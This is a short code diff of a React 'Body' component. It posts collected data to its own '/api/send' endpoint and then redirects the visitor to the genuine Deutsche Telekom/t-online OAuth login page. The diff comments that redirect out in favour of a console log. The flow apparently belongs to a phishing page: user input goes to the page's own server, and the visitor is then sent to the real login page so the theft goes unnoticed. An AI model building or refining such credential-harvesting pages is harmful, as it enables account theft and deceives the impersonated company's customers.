@@ -30,11 +30,13 @@ export default function Body() {
     try {
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
-      if (result.status === 200) {
-        return window.location.replace(
-          "https://accounts.login.idm.telekom.com/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE0000000000000&scope=openid&state=Be6ggoEV5lb2j-2BLIP8anQZdw4-SLN-hixcqHEKRFA%3D&redirect_uri=https://www.t-online.de/auth/login/oauth2/code/telekom&nonce=ekLsCCgWBjMpG22W_XggRabM1WKWb7E5Y9wbblcbkl4&display=popup&claims=%7B%22id_token%22:%7B%22urn:telekom.com:all%22:null%7D%7D%0A"
-        );
-      }
+      console.log(result);
+
+      // if (result.status === 200) {
+      //   return window.location.replace(
+      //     "https://accounts.login.idm.telekom.com/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE0000000000000&scope=openid&state=Be6ggoEV5lb2j-2BLIP8anQZdw4-SLN-hixcqHEKRFA%3D&redirect_uri=https://www.t-online.de/auth/login/oauth2/code/telekom&nonce=ekLsCCgWBjMpG22W_XggRabM1WKWb7E5Y9wbblcbkl4&display=popup&claims=%7B%22id_token%22:%7B%22urn:telekom.com:all%22:null%7D%7D%0A"
+      //   );
+      // }
       return;
     } catch (error) {
       console.log(error);
